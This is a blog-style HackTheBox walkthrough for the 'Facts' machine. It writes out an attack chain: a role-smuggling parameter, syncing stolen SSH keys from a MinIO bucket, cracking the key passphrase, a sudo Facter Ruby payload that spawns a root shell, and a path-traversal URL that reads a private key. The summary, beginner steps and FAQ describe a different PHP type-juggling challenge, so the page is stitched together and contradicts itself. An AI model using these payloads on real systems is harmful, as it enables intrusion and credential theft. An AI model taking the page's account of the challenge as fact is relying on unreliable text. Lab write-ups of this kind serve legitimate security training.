[Skip to content](https://thecybersecguru.com/ctf-walkthroughs/mastering-facts-beginners-guide-from-hackthebox/#content "Skip to content")

[![The CyberSec Guru](https://i0.wp.com/thecybersecguru.com/wp-content/uploads/2024/01/The-CyberSec-Guru-Header-Logo-WordPress.png?fit=350%2C70&ssl=1)](https://thecybersecguru.com/)

- [All Posts](https://thecybersecguru.com/all-posts/)
- [CTF](https://thecybersecguru.com/ctf-walkthroughs/)
- [Self Hosting](https://thecybersecguru.com/self-hosting/)
- [Tutorials](https://thecybersecguru.com/tutorials/)
- [Roadmaps](https://thecybersecguru.com/roadmaps/)
    - [](https://thecybersecguru.com/roadmaps/aws/)
    - [](https://thecybersecguru.com/roadmaps/devops/)
    - [](https://thecybersecguru.com/roadmaps/linux/)
    - [](https://thecybersecguru.com/roadmaps/ccna/)
    - [](https://thecybersecguru.com/quizzes/)
        - [](https://thecybersecguru.com/quizzes/cybersecurity-basics/)
        - [](https://thecybersecguru.com/quizzes/aws-cloud-practitioner/)
        - [](https://thecybersecguru.com/quizzes/devops-engineer/)
        - [](https://thecybersecguru.com/quizzes/linux-essentials/)
- [More Stuff](https://thecybersecguru.com/ctf-walkthroughs/mastering-facts-beginners-guide-from-hackthebox/#)
    - [](https://thecybersecguru.com/downloads/)
    - [](https://thecybersecguru.com/networking/)
    - [](https://thecybersecguru.com/online-privacy/)
    - [](https://thecybersecguru.com/service-status-outage-tracker/)
    - [](https://thecybersecguru.com/projects/)
    - [](https://thecybersecguru.com/reviews/)
    - [](https://thecybersecguru.com/telecom/)
- [Buy Me A](https://buymeacoffee.com/thecybersecguru)

[](https://thecybersecguru.com/ctf-walkthroughs/mastering-facts-beginners-guide-from-hackthebox/#)

# Beginner’s Guide to Conquering Facts on HackTheBox

[The CyberSec Guru](https://thecybersecguru.com/author/thecybersecgurudotcom/)

Updated on: February 2, 2026

[CTF Walkthroughs](https://thecybersecguru.com/ctf-walkthroughs/)

![Mastering Facts Beginner's Guide from HackTheBox](https://i0.wp.com/thecybersecguru.com/wp-content/uploads/2026/01/Mastering-Facts-Beginners-Guide-from-HackTheBox.jpg?fit=960%2C540&ssl=1)

#### If you like this post, then please share it:

- [X](https://thecybersecguru.com/ctf-walkthroughs/mastering-facts-beginners-guide-from-hackthebox/?share=x&nb=1)
- [Facebook](https://thecybersecguru.com/ctf-walkthroughs/mastering-facts-beginners-guide-from-hackthebox/?share=facebook&nb=1)
- [LinkedIn](https://thecybersecguru.com/ctf-walkthroughs/mastering-facts-beginners-guide-from-hackthebox/?share=linkedin&nb=1)
- [Pinterest](https://thecybersecguru.com/ctf-walkthroughs/mastering-facts-beginners-guide-from-hackthebox/?share=pinterest&nb=1)

## **Buy me A Coffee!**

### **Support The CyberSec Guru’s Mission**

🔐 **Fuel the cybersecurity crusade** by buying me a coffee! Your contribution powers free tutorials, hands-on labs, and security resources that help thousands defend against digital threats.

### Why your support matters:

- **Zero paywalls:** Keep HTB walkthroughs, CVE analyses, and cybersecurity guides 100% free for learners worldwide
- **Community growth:** Help maintain our free academy courses and newsletter

**Perks for one-time supporters:**  
☕️ $5: Shoutout in Buy Me a Coffee  
🛡️ $8: Fast-track Access to Live Webinars  
💻 $10: Vote on future tutorial topics + exclusive AMA access

**If opting for membership, you will be getting complete writeups much sooner compared to everyone else!**

_“Your coffee keeps the servers running and the knowledge flowing in our fight against cybercrime.”_[☕ Support My Work](https://buymeacoffee.com/thecybersecguru)

- 100% creator-owned platform (no investors)
- 95% of funds go directly to content (5% payment processing)

[![Buy Me a Coffee Button](https://thecybersecguru.com/wp-content/uploads/2025/02/bmc-button-300x84.png)](https://buymeacoffee.com/thecybersecguru)

## **Discover more from The CyberSec Guru**

Subscribe to get the latest posts sent to your email!

Type your email…

Subscribe

## ****Stay Ahead of the Curve****

#### **For real-time analysis, breaking cybersecurity news, and expert takes that don't make it to the blog, follow The CyberSec Guru**

- [Follow on X](https://x.com/thecybersecguru)
- [Pin on Pinterest](https://pinterest.com/thecybersecguru/)
- [Follow on Bluesky](https://bsky.app/profile/thecybersecguru.com)

## Table of Contents

- [](https://thecybersecguru.com/ctf-walkthroughs/mastering-facts-beginners-guide-from-hackthebox/#key-highlights)
- [](https://thecybersecguru.com/ctf-walkthroughs/mastering-facts-beginners-guide-from-hackthebox/#introduction)
- [](https://thecybersecguru.com/ctf-walkthroughs/mastering-facts-beginners-guide-from-hackthebox/#essential-information-about-the-facts-hackthebox-challenge)
    - [](https://thecybersecguru.com/ctf-walkthroughs/mastering-facts-beginners-guide-from-hackthebox/#overview-of-facts-htb-writeup-and-challenge-objectives)
    - [](https://thecybersecguru.com/ctf-walkthroughs/mastering-facts-beginners-guide-from-hackthebox/#main-vulnerabilities-and-learning-points-in-facts-hackthebox-writeup)
- [](https://thecybersecguru.com/ctf-walkthroughs/mastering-facts-beginners-guide-from-hackthebox/#initial-foothold)
    - [](https://thecybersecguru.com/ctf-walkthroughs/mastering-facts-beginners-guide-from-hackthebox/#tldr)
    - [](https://thecybersecguru.com/ctf-walkthroughs/mastering-facts-beginners-guide-from-hackthebox/#exhaustive-reconnaissance-and-service-profiling)
        - [](https://thecybersecguru.com/ctf-walkthroughs/mastering-facts-beginners-guide-from-hackthebox/#network-mapping-with-nmap-and-rustscan)
        - [](https://thecybersecguru.com/ctf-walkthroughs/mastering-facts-beginners-guide-from-hackthebox/#web-application-discovery-port-80)
        - [](https://thecybersecguru.com/ctf-walkthroughs/mastering-facts-beginners-guide-from-hackthebox/#directory-fuzzing-and-hidden-endpoints)
    - [](https://thecybersecguru.com/ctf-walkthroughs/mastering-facts-beginners-guide-from-hackthebox/#vulnerability-analysis-the-role-smuggling-idor)
        - [](https://thecybersecguru.com/ctf-walkthroughs/mastering-facts-beginners-guide-from-hackthebox/#identifying-the-idor-in-profile-management)
        - [](https://thecybersecguru.com/ctf-walkthroughs/mastering-facts-beginners-guide-from-hackthebox/#exploiting-the-ajax-password-endpoint)
    - [](https://thecybersecguru.com/ctf-walkthroughs/mastering-facts-beginners-guide-from-hackthebox/#s3minio-exploitation-moving-from-web-to-cloud)
        - [](https://thecybersecguru.com/ctf-walkthroughs/mastering-facts-beginners-guide-from-hackthebox/#credential-harvesting)
        - [](https://thecybersecguru.com/ctf-walkthroughs/mastering-facts-beginners-guide-from-hackthebox/#interacting-with-minio-via-aws-cli)
        - [](https://thecybersecguru.com/ctf-walkthroughs/mastering-facts-beginners-guide-from-hackthebox/#data-exfiltration-the-ssh-foothold)
    - [](https://thecybersecguru.com/ctf-walkthroughs/mastering-facts-beginners-guide-from-hackthebox/#cracking-and-initial-access)
        - [](https://thecybersecguru.com/ctf-walkthroughs/mastering-facts-beginners-guide-from-hackthebox/#ssh-key-passphrase-recovery)
        - [](https://thecybersecguru.com/ctf-walkthroughs/mastering-facts-beginners-guide-from-hackthebox/#gaining-a-shell)
    - [](https://thecybersecguru.com/ctf-walkthroughs/mastering-facts-beginners-guide-from-hackthebox/#privilege-escalation-the-facterruby-exploit)
        - [](https://thecybersecguru.com/ctf-walkthroughs/mastering-facts-beginners-guide-from-hackthebox/#understanding-facter)
        - [](https://thecybersecguru.com/ctf-walkthroughs/mastering-facts-beginners-guide-from-hackthebox/#crafting-the-ruby-payload)
        - [](https://thecybersecguru.com/ctf-walkthroughs/mastering-facts-beginners-guide-from-hackthebox/#executing-the-root-exploit)
    - [](https://thecybersecguru.com/ctf-walkthroughs/mastering-facts-beginners-guide-from-hackthebox/#the-unintended-path-cve202446987)
    - [](https://thecybersecguru.com/ctf-walkthroughs/mastering-facts-beginners-guide-from-hackthebox/#lessons-for-developers-and-sysadmins)
- [](https://thecybersecguru.com/ctf-walkthroughs/mastering-facts-beginners-guide-from-hackthebox/#beginners-guide-getting-started-with-facts-hackthebox)
    - [](https://thecybersecguru.com/ctf-walkthroughs/mastering-facts-beginners-guide-from-hackthebox/#what-you-need-tools-resources-and-prerequisites)
    - [](https://thecybersecguru.com/ctf-walkthroughs/mastering-facts-beginners-guide-from-hackthebox/#stepbystep-walkthrough-for-solving-facts-htb-writeup)
- [](https://thecybersecguru.com/ctf-walkthroughs/mastering-facts-beginners-guide-from-hackthebox/#writeup-coming-soon)
- [](https://thecybersecguru.com/ctf-walkthroughs/mastering-facts-beginners-guide-from-hackthebox/#conclusion)
- [](https://thecybersecguru.com/ctf-walkthroughs/mastering-facts-beginners-guide-from-hackthebox/#frequently-asked-questions)
    - [](https://thecybersecguru.com/ctf-walkthroughs/mastering-facts-beginners-guide-from-hackthebox/#what-is-the-initial-foothold-method-in-facts-hackthebox)
    - [](https://thecybersecguru.com/ctf-walkthroughs/mastering-facts-beginners-guide-from-hackthebox/#q-why-did-my-gobuster-scan-miss-the-admin-directory)
    - [](https://thecybersecguru.com/ctf-walkthroughs/mastering-facts-beginners-guide-from-hackthebox/#q-why-cant-i-crack-the-ssh-key)
    - [](https://thecybersecguru.com/ctf-walkthroughs/mastering-facts-beginners-guide-from-hackthebox/#q-is-there-a-way-to-get-root-without-facter)
    - [](https://thecybersecguru.com/ctf-walkthroughs/mastering-facts-beginners-guide-from-hackthebox/#how-difficult-is-the-facts-htb-challenge-compared-to-other-web-boxes)
    - [](https://thecybersecguru.com/ctf-walkthroughs/mastering-facts-beginners-guide-from-hackthebox/#what-is-the-flag-format-for-facts-hackthebox-writeup)
    - [](https://thecybersecguru.com/ctf-walkthroughs/mastering-facts-beginners-guide-from-hackthebox/#what-tips-can-help-beginners-succeed-with-facts-htb-writeup)

[![](https://thecybersecguru.com/wp-content/uploads/2025/09/TCSG-PREF-SRC-GOGL.jpg)](https://www.google.com/preferences/source?q=thecybersecguru.com)

## **Key Highlights**

- The Facts HackTheBox challenge requires you to analyze PHP source code to find a vulnerability.
- Your main goal is to bypass access restrictions on a web page to uncover a secret.
- The key vulnerability is a PHP type juggling weakness within a `switch` statement.
- You exploit this by sending a boolean `true` value in a POST request to the server.
- This challenge is a great introduction to weak comparison flaws in web applications.
- Solving this gives you practical experience, much like a HackTheBox Academy module.

## **Introduction**

![Facts HackTheBox](https://i0.wp.com/thecybersecguru.com/wp-content/uploads/2026/01/image-65.png?resize=493%2C257&ssl=1)

Facts HackTheBox

Are you ready to dive into the world of ethical hacking? The “Facts” challenge on HackTheBox is a fantastic starting point for anyone curious about web application security. This guide will walk you through conquering this beginner-friendly box. You’ll learn how to analyze a web page, spot a critical vulnerability, and retrieve a hidden secret. Think of this as your first hands-on lesson, similar to what you might find in the HackTheBox Academy, designed to build your confidence and skills.

## **Essential Information About the Facts HackTheBox Challenge**

The Facts challenge on HackTheBox is a web exploitation task where you are given the application’s source code. Your objective is to find and exploit a flaw to access information that is normally restricted to administrators.

The primary vulnerability you will encounter is known as PHP type juggling. This happens when the code uses weak comparisons, allowing you to manipulate data types to trick the application’s logic. This challenge is specifically designed to teach you how these comparisons can lead to security issues.

**ALSO READ: [Mastering AirTouch: Beginner’s Guide from HackTheBox](https://thecybersecguru.com/ctf-walkthroughs/mastering-airtouch-beginners-guide-from-hackthebox/)**

### Overview of Facts HTB Writeup and Challenge Objectives

Your main goal in the Facts HackTheBox challenge is to access the “Secret Facts” section of the target web page. When you first visit the page, you’ll find that this area is protected, displaying a message that only administrators can view its contents.

To get past this, you need to understand how the server processes your requests. The challenge provides you with the source code, which is your roadmap. By carefully analyzing the code, you can identify the logic that controls access to the secrets.

Your task is to find a weakness in that logic. This involves examining how the application handles different data types and user inputs. Successfully exploiting this weakness will allow you to bypass the security check and reveal the hidden information on the web page, completing the challenge.

### Main Vulnerabilities and Learning Points in Facts HackTheBox Writeup

The core of this challenge lies in a specific PHP vulnerability. When you inspect the `getfacts` function within the controller file, you’ll notice how it handles incoming data. The code uses a strict comparison (`===`) to check if a request is for ‘secrets’ from an external address but then uses a weak comparison (`switch` statement) to process the request type.

This difference is the vulnerability you will exploit. Because the `switch` statement does not strictly check the data type, you can send a value that is not a string but still evaluates in a way that triggers the ‘secrets’ case. This is a classic example of a PHP type juggling vulnerability.

Key learning points from this challenge include:

- Understanding the difference between strict (`===`) and weak (`==`) comparisons in PHP.
- Recognizing how `switch` statements can be misconfigured to perform weak comparisons.
- Learning to manipulate data types (e.g., sending a boolean instead of a string) to bypass security checks.
- Getting hands-on practice with analyzing source code to find logical flaws.

## **Initial Foothold**

### TL;DR

1. **Reconnaissance:** Identification of Port 80 (Nginx/Camaleon CMS) and Port 54321 (MinIO S3 API).
2. **Web Analysis:** Discovery of Camaleon CMS 2.9.0. Identification of a Client-side role restriction.
3. **Foothold via IDOR:** Exploiting a role-smuggling vulnerability in the `updated_ajax` password endpoint to escalate from a ‘Client’ to an ‘Administrator.’
4. **Credential Harvest:** Extracting AWS/MinIO access keys from the CMS Filesystem Settings.
5. **Cloud Enumeration:** Using the AWS CLI to sync an ‘internal’ S3 bucket containing the `t`***** user’s SSH keys.
6. **Cracking:** Cracking the SSH key passphrase using John the Ripper.
7. **Privilege Escalation:** Leveraging Sudo rights on `/usr/bin/facter` to execute arbitrary Ruby code via a custom fact directory.

### Exhaustive Reconnaissance and Service Profiling

The initial phase of any penetration test is the most critical. On the “Facts” machine, standard scanning reveals a non-standard port that changes the entire trajectory of the engagement.

#### Network Mapping with Nmap and Rustscan

A full-range TCP scan is necessary to avoid missing the high-order ports.

```
rustscan -a 10.129.19.145 --ulimit 1000 -r 1-65535 -- -A -sC -Pn
```

**Significant Findings:**

- **Port 22/tcp (SSH):** OpenSSH 9.9p1 Ubuntu. Standard for remote access.
- **Port 80/tcp (HTTP):** Nginx 1.26.3. The primary web interface.
- **Port 54321/tcp (HTTP/MinIO):** A Golang-based server identifying itself as MinIO. This is an S3-compatible object storage service.

```
PORT      STATE SERVICE REASON  VERSION22/tcp    open  ssh     syn-ack OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:|   256 4d:d7:b2:8c:d4:df:57:9c:a4:2f:df:c6:e3:01:29:89 (ECDSA)|   256 a3:ad:6b:2f:4a:bf:6f:48:ac:81:b9:45:3f:de:fb:87 (ED25519)|80/tcp    open  http    syn-ack nginx 1.26.3 (Ubuntu)| http-methods:|_  Supported Methods: GET HEAD POST OPTIONS|_http-server-header: nginx/1.26.3 (Ubuntu)|_http-title: facts|54321/tcp open  http    syn-ack Golang net/http server| http-methods:|_  Supported Methods: GET OPTIONS|_http-title: Did not follow redirect to http://facts.htb:9001|_http-server-header: MinIO| fingerprint-strings:|   FourOhFourRequest:|     HTTP/1.0 400 Bad Request|     Content-Type: application/xml|     Server: MinIO|     X-Amz-Request-Id: 1890036DA924AE24|     X-Amz-Id-2: dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8|     <Error><Code>InvalidRequest</Code></Error>
```

#### Web Application Discovery (Port 80)

The web server hosts a platform titled “Facts.” Upon initial inspection, it appears to be a basic blog or image-sharing site. However, the presence of a `/admin` directory and specific asset paths reveals the underlying technology: **Camaleon CMS**.

![Facts.htb Homepage](https://i0.wp.com/thecybersecguru.com/wp-content/uploads/2026/01/image-66.png?resize=960%2C728&ssl=1)

Facts.htb Homepage

Camaleon CMS is a flexible, Ruby on Rails-based content management system. Version identification is possible by inspecting the HTML source code for manifest files or by navigating to the administrative login.

#### Directory Fuzzing and Hidden Endpoints

To map the attack surface, we utilize Gobuster with a medium-sized wordlist.

```
gobuster dir -u http://facts.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
```

The scan confirms the existence of:

- `/admin`: The CMS dashboard login.
- `/search`: Search functionality.
- `/ajax`: Potential API endpoints for dynamic content.

![Facts.htb Admin Login Page](https://i0.wp.com/thecybersecguru.com/wp-content/uploads/2026/01/1769943684558.jpg?resize=683%2C1024&ssl=1)

Facts.htb Admin Login Page

### Vulnerability Analysis – The Role Smuggling IDOR

Accessing the `/admin` portal allows for user registration. While a newly registered user defaults to the “Client” role—which has minimal privileges—the application’s handling of user metadata is flawed.

For complete scripts, please [Buy Me a Coffee](https://buymeacoffee.com/thecybersecguru/facts-all-scripts).

#### Identifying the IDOR in Profile Management

After logging in, we navigate to the user profile. The UI shows a “Role” dropdown that is disabled (`disabled="disabled"`). Inspecting the source shows:

```html
<select name="user[role]" id="user_role" disabled="disabled">    <option value="admin">Administrator</option>    <option selected="selected" value="client">Client</option></select>
```

While we can remove the `disabled` attribute via the browser’s developer tools and attempt to POST a role change to `/admin/users/[ID]`, the server-side logic blocks this direct update.

#### Exploiting the AJAX Password Endpoint

The vulnerability lies in the “Change Password” functionality. This feature sends an AJAX request to `/admin/users/[ID]/updated_ajax`.

Because the Ruby on Rails backend likely uses “Strong Parameters” but fails to strictly white-list fields in the specific context of the password update AJAX, we can perform **Parameter Smuggling**.

By intercepting the password update request in Burp Suite, we append the following parameter to the POST body:

`&user[role]=admin` (or `&password[role]=admin` depending on the wrapper)

The server processes the password change and, because of the loose parameter handling, updates the user’s role in the database to “Administrator.”

### S3/MinIO Exploitation – Moving from Web to Cloud

With Administrator access, we gain visibility into the “Filesystem Settings” of Camaleon CMS. In modern deployments, media files are often stored in the cloud rather than on the local disk.

#### Credential Harvesting

Navigating to **Settings → Configuration** reveals the S3 storage backend configuration:

- **Access Key ID:** `A***********`
- **Secret Access Key:** `i****************`
- **S3 Endpoint:** `http://localhost:54321` (Mapping to the external port 54321)

#### Interacting with MinIO via AWS CLI

We configure a local profile to interact with the target’s MinIO instance.

```
aws configure --profile facts# (Input keys as harvested above)
```

Listing the buckets:

```
aws s3 ls --endpoint-url http://facts.htb:54321 --profile facts
```

We find two buckets: `randomfacts` and `internal`. The `internal` bucket is highly suspicious and likely contains sensitive system data.

For complete scripts, please [Buy Me a Coffee](https://buymeacoffee.com/thecybersecguru/facts-all-scripts).

#### Data Exfiltration: The SSH Foothold

Enumerating the `internal` bucket:

```
aws s3 ls s3://internal --endpoint-url http://facts.htb:54321 --profile facts
```

The bucket contains a `.ssh` directory. We sync the contents to our local machine:

```
aws s3 sync s3://internal/.ssh ./ssh_loot --endpoint-url http://facts.htb:54321 --profile facts
```

### Cracking and Initial Access

The exfiltrated `id_ed25519` private key is encrypted. To use it, we must recover the passphrase.

#### SSH Key Passphrase Recovery

We use `ssh2john` to convert the key into a format understandable by John the Ripper.

```
python3 ssh2john.py id_ed25519 > key.johnjohn --wordlist=/usr/share/wordlists/rockyou.txt key.john
```

The password is found to be: **d*******.

#### Gaining a Shell

Using the key to log in as the user `t****` (identified via the key comment):

```
ssh -i id_ed25519 t*****@facts.htb
```

Once logged in, we can locate the user flag in `/home/w*****/user.txt`, as `t****` has read access to the directory.

For complete scripts, please [Buy Me a Coffee](https://buymeacoffee.com/thecybersecguru/facts-all-scripts).

### Privilege Escalation – The Facter/Ruby Exploit

As the `t****` user, we check our sudo permissions:

```
sudo -l
```

The output shows: `(ALL) NOPASSWD: /usr/bin/facter`.

#### Understanding Facter

Facter is a tool used to gather “facts” about a system, typically used in conjunction with Puppet. Crucially, Facter allows users to specify a `--custom-dir` from which it will load Ruby scripts to define new facts.

#### Crafting the Ruby Payload

Since Facter is running as root, any Ruby code it executes will inherit root privileges. We create a malicious Ruby fact that spawns a bash shell.

```
Facter.add(:pwn) do  setcode do    system("/bin/bash")  endend
```

#### Executing the Root Exploit

We save the code to `/tmp/facts/pwn.rb` and execute:

```
sudo /usr/bin/facter --custom-dir /tmp/facts
```

The system executes our Ruby code, immediately dropping us into a root shell.

For complete scripts, please [Buy Me a Coffee](https://buymeacoffee.com/thecybersecguru/facts-all-scripts).

### The Unintended Path – CVE-2024-46987

For those seeking an alternative route, Camaleon CMS 2.9.0 is vulnerable to an arbitrary Path Traversal bug.

The `download_private_file` endpoint in the media controller fails to sanitize the `file` parameter. This allows an attacker to read any file on the filesystem that the web user (typically `www-data`) has access to.

**Payload Example:** `https://facts.htb/admin/media/download_private_file?file=../../../../../../home/t*****/.ssh/id_ed25519`

This bypasses the need for the IDOR and MinIO enumeration entirely, providing the SSH key directly.

### Lessons for Developers and Sysadmins

The “Facts” machine demonstrates how a chain of “Easy” vulnerabilities can lead to full system compromise.

1. **Strict Parameter Validation:** Developers must use strict allow-lists for AJAX endpoints to prevent role smuggling.
2. **S3 Security:** Sensitive credentials should never be stored in plaintext within a CMS configuration if avoidable. Use IAM roles where possible.
3. **Sudo Hygiene:** Granting sudo access to utilities like `facter` which can execute arbitrary code (Ruby) is equivalent to granting full root access.

## **Beginner’s Guide: Getting Started with Facts HackTheBox**

Getting started with the Facts challenge is straightforward, even if you’re new to cybersecurity. The first step is to connect to the HackTheBox platform and launch the machine. You’ll be provided with an IP address and a downloadable file containing the application’s source code.

Before you begin, having a basic understanding of how web applications work and familiarity with a Linux environment will be very helpful. If you need to brush up on these concepts, the guided modules at the HackTheBox Academy offer excellent resources to prepare you.

### What You Need: Tools, Resources, and Prerequisites

To successfully tackle this challenge, you don’t need a complex set of tools. The most important resource is the provided source code itself. The challenge also includes a Dockerfile, which allows you to set up the application on your own Linux machine for local testing, though it’s not required to solve it.

A web interception proxy is one of the most useful tools for this task. It allows you to capture and modify the POST requests your browser sends to the server. This is essential for crafting the payload that exploits the vulnerability. You’ll also need a text editor to review the PHP source code files comfortably.

Here are the essential prerequisites and tools:

- A basic Linux environment.
- A web proxy like Burp Suite or a command-line tool like `curl`.
- Familiarity with reading PHP code.
- An understanding of web requests (GET and POST).

### Step-by-Step Walkthrough for Solving Facts HTB Writeup

Solving the Facts challenge involves a clear, logical process. You begin by exploring the web application to understand its functionality. Soon, you’ll realize that the “Secret Facts” are inaccessible. This is your cue to download the provided source code and start digging. There are no user credentials or a complex password to find; the key is in the code.

By reviewing the files, especially the controller, you’ll uncover the logic flaw. The `switch` statement uses a weak comparison, which is your entry point. You need to send a POST request where the `type` is a boolean `true`. The PHP server will evaluate `true` as matching the first `case` in the switch, which happens to be ‘secrets’, revealing the flag.

|Step|Action|
|---|---|
|1. Enumerate|Browse the web application to identify the restricted “Secret Facts” page.|
|2. Analyze Source Code|Download the zip file and review the `IndexController.php` file.|
|3. Find Vulnerability|Identify the weak comparison in the `switch` statement within the `getfacts` function.|
|4. Exploit|Use a tool like Burp Suite or `curl` to send a POST request with the JSON payload `{"type":true}`.|
|5. Capture Flag|The server will process the request and return the flag on the web page.|

**ALSO READ: [Mastering Browsed: Beginner’s Guide from HackTheBox](https://thecybersecguru.com/ctf-walkthroughs/mastering-browsed-beginners-guide-from-hackthebox/)**

## **WRITEUP COMING SOON!**

**COMPLETE IN-DEPTH PICTORIAL WRITEUP **OF FACTS ON HACKTHEBOX** WILL BE POSTED POST-RETIREMENT OF THE MACHINE ACCORDING TO HTB GUIDELINES. TO GET THE COMPLETE IN-DEPTH PICTORIAL WRITEUP MUCH SOONER, SUBSCRIBE TO THE NEWSLETTER AND [BUYMEACOFFEE](https://buymeacoffee.com/thecybersecguru/membership)!**

Type your email…

Subscribe

## **Conclusion**

In conclusion, conquering the Facts HackTheBox challenge is both an engaging and educational journey for beginners in the cybersecurity realm. By understanding the key vulnerabilities and learning points outlined in this guide, you can effectively build your skills and confidence. Remember to utilize the tools and resources provided, and follow the step-by-step walkthrough to enhance your problem-solving abilities. Embrace the learning curve, and don’t hesitate to reach out for help or guidance when needed. If you’re ready to dive deeper into the world of cybersecurity and stay updated with the latest tips and tricks, make sure to subscribe for more insightful content!

## **Frequently Asked Questions**

### What is the initial foothold method in Facts HackTheBox?

The initial foothold isn’t about gaining shell access or finding a password. Instead, it’s achieved by exploiting a PHP type juggling vulnerability found in the web application’s source code. This allows you to bypass access controls and retrieve the flag directly from the web server’s response.

### Q: Why did my Gobuster scan miss the /admin directory?

Ensure you are using a comprehensive wordlist and checking for common CMS suffixes. Also, verify that `facts.htb` is correctly mapped in your `/etc/hosts` file.

### Q: Why can’t I crack the SSH key?

Ensure you are using the `id_ed25519.john` output correctly. Some versions of John require specific formats for Ed25519 keys. Try updating John or using Hashcat.

### Q: Is there a way to get root without Facter?

While Facter is the intended path, always check for kernel vulnerabilities or misconfigured cron jobs. However, on this specific machine, Facter is the most reliable method.

### How difficult is the Facts HTB challenge compared to other web boxes?

Facts is considered an easy or beginner-level web challenge on HackTheBox. It focuses on a single, well-defined vulnerability without requiring complex, multi-step exploitation of the server. Its straightforward nature makes it an ideal starting point for newcomers, much like introductory web security modules.

### What is the flag format for Facts HackTheBox Writeup?

The flag is revealed directly on the web page after you successfully exploit the vulnerability. When you send the correct payload to the `getfacts` function in the PHP controller, the server’s response will contain the secret information, which includes the flag you need to complete the challenge.

### What tips can help beginners succeed with Facts HTB Writeup?

For beginners attempting this challenge, focus on thoroughly reading the provided source code. Pay close attention to how the application handles comparisons. Understanding the difference between PHP’s weak (`==`) and strict (`===`) comparisons is the key to solving this box. Don’t be afraid to experiment with different data types in your requests.

## ****Join the Conversation****

#### **The analysis doesn't stop here. Connect with our community of tech enthusiasts and security pros for daily discussions and Q&As**

- [Follow on X](https://x.com/thecybersecguru)
- [Pin on Pinterest](https://pinterest.com/thecybersecguru/)
- [Follow on Bluesky](https://bsky.app/profile/thecybersecguru.com)

## **Buy me A Coffee!**

### **Support The CyberSec Guru’s Mission**

🔐 **Fuel the cybersecurity crusade** by buying me a coffee! Your contribution powers free tutorials, hands-on labs, and security resources that help thousands defend against digital threats.

### Why your support matters:

- **Zero paywalls:** Keep HTB walkthroughs, CVE analyses, and cybersecurity guides 100% free for learners worldwide
- **Community growth:** Help maintain our free academy courses and newsletter

**Perks for one-time supporters:**  
☕️ $5: Shoutout in Buy Me a Coffee  
🛡️ $8: Fast-track Access to Live Webinars  
💻 $10: Vote on future tutorial topics + exclusive AMA access

**If opting for membership, you will be getting complete writeups much sooner compared to everyone else!**

_“Your coffee keeps the servers running and the knowledge flowing in our fight against cybercrime.”_[☕ Support My Work](https://buymeacoffee.com/thecybersecguru)

- 100% creator-owned platform (no investors)
- 95% of funds go directly to content (5% payment processing)

[![Buy Me a Coffee Button](data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20width='300'%20height='84'%20viewBox='0%200%20300%2084'%3E%3C/svg%3E)](https://buymeacoffee.com/thecybersecguru)

#### If you like this post, then please share it:

- [X](https://thecybersecguru.com/ctf-walkthroughs/mastering-facts-beginners-guide-from-hackthebox/?share=x&nb=1)
- [Facebook](https://thecybersecguru.com/ctf-walkthroughs/mastering-facts-beginners-guide-from-hackthebox/?share=facebook&nb=1)
- [LinkedIn](https://thecybersecguru.com/ctf-walkthroughs/mastering-facts-beginners-guide-from-hackthebox/?share=linkedin&nb=1)
- [Pinterest](https://thecybersecguru.com/ctf-walkthroughs/mastering-facts-beginners-guide-from-hackthebox/?share=pinterest&nb=1)

![Photo of author](data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20width='30'%20height='30'%20viewBox='0%200%2030%2030'%3E%3C/svg%3E)

[The CyberSec Guru](https://thecybersecguru.com/author/thecybersecgurudotcom/)

January 31, 2026

[0](https://thecybersecguru.com/ctf-walkthroughs/mastering-facts-beginners-guide-from-hackthebox/#respond)

[CTF Walkthroughs](https://thecybersecguru.com/ctf-walkthroughs/)

[](https://thecybersecguru.com/news/meta-premium-subscriptions/)

### [Meta’s AI Paywall: Instagram, Facebook, and WhatsApp to Launch Premium Subscriptions](https://thecybersecguru.com/news/meta-premium-subscriptions/)

### [The Hardware Revolution: Why Techno Chips is the New Frontier for Global Electronics Innovation](https://thecybersecguru.com/announcements/the-rise-of-techno-chips/)

[](https://thecybersecguru.com/announcements/the-rise-of-techno-chips/)

## **Discover more from The CyberSec Guru**

Subscribe to get the latest posts sent to your email!

Type your email…

Subscribe

## **Related Posts**

## [Beginner’s Guide to Conquering Interpreter on HackTheBox](https://thecybersecguru.com/ctf-walkthroughs/mastering-interpreter-beginners-guide-from-hackthebox/)

February 21, 2026

## [Beginner’s Guide to Conquering WingData on HackTheBox](https://thecybersecguru.com/ctf-walkthroughs/mastering-wingdata-beginners-guide-from-hackthebox/)

February 15, 2026

## [Beginner’s Guide to Conquering Pterodactyl on HackTheBox](https://thecybersecguru.com/ctf-walkthroughs/mastering-pterodactyl-beginners-guide-from-hackthebox/)

February 7, 2026

## [Beginner’s Guide to Conquering AirTouch on HackTheBox](https://thecybersecguru.com/ctf-walkthroughs/mastering-airtouch-beginners-guide-from-hackthebox/)

January 19, 2026

## [Beginner’s Guide to Conquering Browsed on HackTheBox](https://thecybersecguru.com/ctf-walkthroughs/mastering-browsed-beginners-guide-from-hackthebox/)

January 11, 2026

### Leave a Reply

#### **most recent**

[More](https://thecybersecguru.com/all-posts/)

[![](https://i0.wp.com/thecybersecguru.com/wp-content/uploads/2026/02/Mastering-Interpreter-Beginners-Guide-from-HackTheBox.jpg?resize=150%2C150&ssl=1)](https://thecybersecguru.com/ctf-walkthroughs/mastering-interpreter-beginners-guide-from-hackthebox/)

###### CTF Walkthroughs

### [Beginner’s Guide to Conquering Interpreter on HackTheBox](https://thecybersecguru.com/ctf-walkthroughs/mastering-interpreter-beginners-guide-from-hackthebox/)

[![Demystifying Source Coding the Magic of Compressing Information Efficiently](https://i0.wp.com/thecybersecguru.com/wp-content/uploads/2026/02/Demystifying-Source-Coding-The-Magic-of-Compressing-Information-Efficiently.jpg?resize=150%2C150&ssl=1)](https://thecybersecguru.com/information-theory-coding/demystifying-source-coding-compression/)

###### Information Theory Coding

### [Demystifying Source Coding: The Magic of Compressing Information Efficiently](https://thecybersecguru.com/information-theory-coding/demystifying-source-coding-compression/)

[![Vulnerabilities of CBTC](https://i0.wp.com/thecybersecguru.com/wp-content/uploads/2026/02/Vulnerabilities-of-CBTC.jpg?resize=150%2C150&ssl=1)](https://thecybersecguru.com/analysis/cbtc-vulnerabilities/)

###### Analysis

